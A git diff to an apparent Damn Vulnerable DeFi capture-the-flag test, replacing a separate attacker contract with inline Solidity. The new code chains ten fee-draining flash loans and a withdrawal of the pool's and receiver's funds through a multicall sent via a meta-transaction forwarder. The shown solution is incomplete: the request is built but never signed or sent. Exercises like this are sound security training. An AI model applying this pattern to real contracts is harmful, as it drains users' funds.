@@ -6,7 +6,8 @@ import {Test, console} from "forge-std/Test.sol";
 import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
 import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
 import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
-import {AttackNaiveReceiver} from "../../src/attacker-contracts/AttackNaiveReceiver.sol";
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
+
 
 contract NaiveReceiverChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -17,7 +18,7 @@ contract NaiveReceiverChallenge is Test {
     uint256 constant WETH_IN_POOL = 1000e18;
     uint256 constant WETH_IN_RECEIVER = 10e18;
 
-    AttackNaiveReceiver attacker;
+
     NaiveReceiverPool pool;
     WETH weth;
     FlashLoanReceiver receiver;
@@ -79,11 +80,31 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        // Deploy attacker's contract
-        attacker = new AttackNaiveReceiver(address(pool), address(receiver));
-        // weth.transfer(address(pool),  WETH_IN_POOL);
-    }
+        bytes memory callFlashloan = abi.encodeCall(
+            pool.flashLoan, (IERC3156FlashBorrower(receiver), address(weth), 0, "0x")
+        );
 
+        uint256 total = WETH_IN_POOL + WETH_IN_RECEIVER;
+        bytes memory callWithdraw = abi.encodePacked(abi.encodeCall(
+            pool.withdraw, (total, payable(recovery))
+        ));
+
+        bytes[] memory callData = new bytes[](11);
+        for (uint256 i = 0; i < 10; i++) {
+            callData[i] = callFlashloan;
+        }
+        callData[10] = callWithdraw;
+
+        BasicForwarder.Request memory request = BasicForwarder.Request({
+            from: player,
+            target: address(pool),
+            value: 0,
+            gas: 100000,
+            nonce: 0,
+            data: abi.encodeCall(pool.multicall, ((callData))),
+            deadline: block.timestamp
+        });
+    }
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
      */
